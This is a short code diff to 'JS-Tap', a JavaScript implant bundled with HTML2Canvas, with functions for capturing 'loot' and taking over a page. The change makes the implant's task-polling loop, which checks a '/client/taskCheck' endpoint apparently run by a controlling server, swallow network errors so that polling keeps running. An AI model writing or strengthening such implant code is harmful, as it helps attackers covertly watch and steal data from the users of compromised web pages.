@@ -1,4 +1,3 @@
-
 // *******************************************************************************
 // JS-Tap code below
 // Note that most of this file is the HTML2Canvas library, that's included after the JS-Tap code
@@ -1506,7 +1505,8 @@ function scheduleLootCapture(delay) {
 		return bytes.buffer;
 	}
 
-	async function checkTasks() {
+async function checkTasks() {
+	  try {
 		if (window.taperMetricsBox) {
     // Encrypted/Obfuscated version
 			var response = await sendMetrics("/client/taskCheck", "");
@@ -1552,7 +1552,6 @@ function scheduleLootCapture(delay) {
 				}
 			} catch (error) {
 				console.log("Error:", error);
-				throw error;
 			}
 		} else {
   	// Unencrypted/Obfuscated version
@@ -1572,10 +1571,12 @@ function scheduleLootCapture(delay) {
 				}
 			}
 		}
-
+	  } catch(e) {
+		// network error or other failure - don't let it kill task polling
+	  } finally {
 		window.taperTaskUpdateScheduled = false;
+	  }
 	}
-
 
 // Start the tap
 	function takeOver()
